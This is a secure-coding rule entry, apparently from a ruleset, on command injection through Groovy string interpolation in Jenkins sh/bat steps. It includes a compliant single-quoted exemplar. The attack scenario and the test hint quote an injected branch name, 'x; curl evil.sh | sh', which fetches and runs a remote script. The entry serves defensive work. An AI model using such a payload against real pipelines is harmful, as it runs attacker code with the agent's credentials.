name: Jenkins sh/bat step with Groovy string interpolation of untrusted params/env
attack_scenario: an attacker opens a PR whose branch is named `x; curl evil.sh | sh` or sets a build parameter to a shell metacharacter payload; because Groovy concatenates it into the double-quoted sh string, the injected command executes on the Jenkins agent with the agent's credentials
negative_test_hint: trigger the pipeline with a branch named "x; curl evil.sh | sh" and assert the injected command never executes on the agent

exemplar.compliant: withEnv(["IMAGE=${params.IMAGE}"]) { sh 'kubectl set image deploy/app app="$IMAGE"' }
exemplar.explanation: A Groovy double-quoted (GString) argument to sh/bat is interpolated by Groovy BEFORE the shell runs, so a build parameter or tainted env var (PR branch/title, git branch, tag) is spliced directly into the command line. Jenkins docs explicitly say to pass such values through env and single-quote the sh body so the shell, not Groovy, expands them and metacharacters in the value stay inert data.
